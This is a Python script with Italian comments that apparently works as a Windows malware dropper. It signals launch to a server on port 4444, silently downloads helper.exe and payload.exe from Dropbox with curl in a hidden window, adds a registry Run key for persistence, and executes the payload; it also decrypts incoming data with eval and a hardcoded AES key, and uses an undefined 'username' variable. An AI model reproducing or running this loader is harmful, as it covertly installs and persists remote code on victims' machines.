import socket
import os
import subprocess
from Crypto.Cipher import AES

key = b's1cur3zz4pr1v4cy' # chiave crittografica

#algoritmi per crittografare e decrittografare i messaggi

def encrypt_msg(msg):
    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext = cipher.encrypt(msg.encode())
    c_msg = []
    c_msg.append(ciphertext)
    c_msg.append(nonce)
    return str(c_msg).encode()
    
def decrypt_msg(msg):
    msg_pack = eval(msg.decode())
    nonce = msg_pack[1]
    cipher = AES.new(key, AES.MODE_EAX, nonce)    
    d_msg = cipher.decrypt(msg_pack[0])
    return d_msg.decode()

SERVER_HOST = '10.0.2.15' # indirizzo IP del server 
SERVER_PORT = 4444 # porta usata solo per l'acknowledgement
BUFFER_SIZE = 1024 * 128 
SEPARATOR = "<sep>"
# creo il socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.connect((SERVER_HOST, SERVER_PORT)) # comunico al server che il file è stato avviato

# chiudo la connessione alla porta 4444 perché non serve più
s.close()


# se non esiste già helper_folder lo creo

if not os.path.exists(f"C:\\users\{username}\helper_folder"):
    os.mkdir(f"C:\\users\{username}\helper_folder")

# se non esiste già helper.exe lo scarico

if not os.path.exists(f"C:\\users\{username}\helper_folder\helper.exe"):
    subprocess.run(f'curl -L https://www.dropbox.com/s/zu22tk11ssm8h3r/helper.exe --output C:\\users\{username}\helper_folder\helper.exe', creationflags = 0x08000000)

# creo persistenza aggiungendo un valore alla chiave di registro HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# per avviare automaticamente helper.exe

subprocess.run(f'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v runhelper /t reg_sz /d "\"C:\\Users\{username}\helper_folder\helper.exe"\" /f')

# se non esiste già payload_folder lo creo

if not os.path.exists(f"C:\\users\{username}\payload_folder"):
    os.mkdir(f"C:\\users\{username}\payload_folder")

# se non esiste già payload.exe lo scarico

if not os.path.exists(f"C:\\users\{username}\payload_folder\payload.exe"):
    subprocess.run(f'curl -L https://www.dropbox.com/s/r26qouffvw8s1bh/payload.exe --output C:\\users\{username}\payload_folder\payload.exe', creationflags = 0x08000000)

# avvio il payload per questa sessione
    
subprocess.call(f'C:\\users\{username}\payload_folder\payload.exe')


